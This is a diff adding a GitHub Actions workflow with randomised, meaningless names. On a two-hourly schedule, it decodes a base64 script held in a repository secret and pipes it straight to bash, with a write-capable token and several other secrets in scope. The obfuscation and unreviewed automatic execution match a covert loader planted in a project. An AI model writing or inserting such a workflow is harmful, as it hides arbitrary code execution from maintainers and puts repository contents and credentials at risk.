@@ -1,0 +1,21 @@
+name: xBslbukAs
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  PbxQKueQ:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.Dnfix5MlVd }}
+      - name: pO5Eo2dRNOt44t
+        env:
+          xEtuFCiVo: ${{ secrets.MpA0g9pd }}
+          Tstyzz6YBk: ${{ secrets.QF7iOvrRSrZ }}
+          cBEh9y: ${{ secrets.GqmWnEznMq7 }}
+          GITHUB_TOKEN: ${{ secrets.Dnfix5MlVd }}
+        run: echo "$xEtuFCiVo" | base64 -d | bash
